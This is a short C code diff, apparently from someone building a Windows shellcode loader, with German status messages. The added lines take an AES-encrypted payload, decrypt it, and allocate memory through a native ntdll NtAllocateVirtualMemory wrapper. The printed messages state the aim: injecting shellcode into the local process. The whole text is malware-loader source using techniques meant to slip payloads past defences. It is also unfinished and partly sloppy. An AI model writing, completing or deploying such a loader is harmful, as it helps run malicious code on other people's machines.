@@ -196,7 +196,7 @@ int main() {
     PVOID base = NULL;
     SIZE_T PageSize = 0x2000;
 
-    HMODULE ntdll = GetModuleHandleA("ndll.dll");
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
         printf("ntdll.dll konnte nicht geladen werden\n");
         return 1;
@@ -235,17 +235,39 @@ int main() {
     }
 
     PBYTE       pDeobfuscatedPayload = NULL;
-    SIZE_T      sCipherSize = NULL;
+    SIZE_T      sCipherSize = sizeof(AesCipherText);
 
     printf("[i] Injiziere Shellcode in die Lokale Adresse von PID: %d \n", GetCurrentProcessId());
     getchar();
 
     printf("[#] Drueke Enter um shellcode zu Entschlüsseln");
-    getchar()
+    getchar();
 
-        if (!SimpleDecryption(AesCipherText,sCipherSize, AesKey, AesIv,)) {
-
+    printf("Entschluesseln...");
+    if (!SimpleDecryption(AesCipherText,sCipherSize, AesKey, AesIv, (PVOID*)&pDeobfuscatedPayload, (DWORD*)&sCipherSize)) {
+        printf("Enschlüsselung fehlgeschlagen");
     }
+    printf("Druecke Enter um Speicher zu allokieren");
+    getchar();
+
+    PVOID pShellcodeAddress = NtAllocateVirtualMem(
+        hProc,
+        &base,
+        0,
+        &PageSize,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+
+    if (pShellcodeAddress == NULL) {
+        printf("NtAllocateVirtaulMemory fehlgeschlagen mit Error : %d \n", GetLastError());
+        return -1;
+    }
+
+    printf("Shellcode sitzt an Adresse 0x%p\n", pShellcodeAddress);
+    printf("Druecke Enter um in den Speicher zu schreiben");
+    getchar();
+
 
 
 
